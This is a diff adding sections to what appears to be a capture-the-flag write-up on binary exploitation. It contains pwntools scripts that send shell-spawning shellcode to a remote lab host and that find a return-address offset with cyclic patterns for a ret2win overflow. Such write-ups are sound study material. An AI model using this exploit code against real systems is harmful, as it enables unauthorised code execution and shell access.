@@ -71,8 +71,45 @@ The offset to reach the admin variable is 76, but why?<br />
 The buffer is located at ebp + 50h, which is 80 in decimal. Then there are two integers (check and guess), and then there's the admin variable. So to overflow the admin variable I have to put 80 - 4 - 4 bytes + 0x59595959.
 
 ### TryExecMe
+I used the following python code, this time I used pwntools (shellcraft) to create a shellcode:
+
+    from pwn import *
+    
+    context.arch = 'amd64'
+    
+    p = remote('10.10.80.153', 9005)
+    
+    shellcode = asm(shellcraft.sh())
+    payload = shellcode
+    
+    p.sendline(payload)
+
+    p.interactive()
+
+
+![image](https://github.com/user-attachments/assets/224a1741-7399-4ffd-ac67-78b23d57f215)<br />
+
 
 ### TryRetMe
+First I use this code to find the right offset to reach the RIP:
+
+        from pwn import *
+        
+        io = process('./tryretme')
+        print(io.recvregex(b':')) # read until we get the prompt
+        
+        io.recvline()
+        io.sendline(cyclic(500))
+        io.wait()
+        core = io.corefile
+        stack = core.rsp
+        info("rsp = %#x", stack)
+        pattern = core.read(stack, 4)
+        rip_offset = cyclic_find(pattern)
+        info("rip offset is %d", rip_offset)
+
+![image](https://github.com/user-attachments/assets/c31a0c06-5204-4b3b-a5b8-11db575070df)<br />
+Now that I know the offset I can overflow the RIP with the address of the `win` function, which is `0x00000000004011dd` (just run "info functions" on gdb to get this address). 
 
 ### Random Memories
 
